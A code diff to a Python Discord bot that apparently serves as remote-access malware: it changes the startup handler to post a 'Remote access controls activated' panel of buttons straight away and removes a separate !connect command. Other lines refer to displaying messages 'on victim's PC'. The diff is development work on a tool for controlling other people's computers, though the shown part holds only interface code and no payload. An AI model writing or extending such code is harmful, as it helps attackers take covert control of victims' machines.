@@ -99,11 +99,19 @@ async def on_ready():
         except:
             pass
         
-        # Send connection message only
+        # Send control panel directly
         try:
-            await channel.send("Bot connected! Use `!connect` to access the control panel.")
-        except:
-            pass
+            embed = discord.Embed(
+                title="🎮 Control Panel",
+                description="Remote access controls activated",
+                color=discord.Color.red()
+            )
+            embed.add_field(name="Available Controls", value="All functions ready to use", inline=False)
+            
+            view = ControlView(author_id=None)
+            await channel.send(embed=embed, view=view)
+        except Exception as e:
+            await channel.send(f"❌ Error loading panel: {str(e)}")
             
 
 
@@ -547,26 +555,7 @@ class MessageModal(discord.ui.Modal, title="Fynox sent a message"):
         
         await interaction.response.send_message("Message displayed on victim's PC.")
 
-@bot.command(name='connect')
-async def connect(ctx):
-    """Zeigt das Control Panel mit allen Funktionen"""
-    try:
-        control_embed = discord.Embed(
-            title="🎮 Control Panel",
-            description="Remote access controls activated",
-            color=discord.Color.blue(),
-            timestamp=datetime.datetime.now()
-        )
-        control_embed.add_field(
-            name="Available Controls", 
-            value="Click the buttons below to execute remote commands", 
-            inline=False
-        )
-        
-        view = ControlView(None)  # Allow any user to use controls
-        await ctx.send(embed=control_embed, view=view)
-    except:
-        await ctx.send("❌ Control Panel konnte nicht geladen werden.")
+
 
 if __name__ == "__main__":
     bot.run(TOKEN)
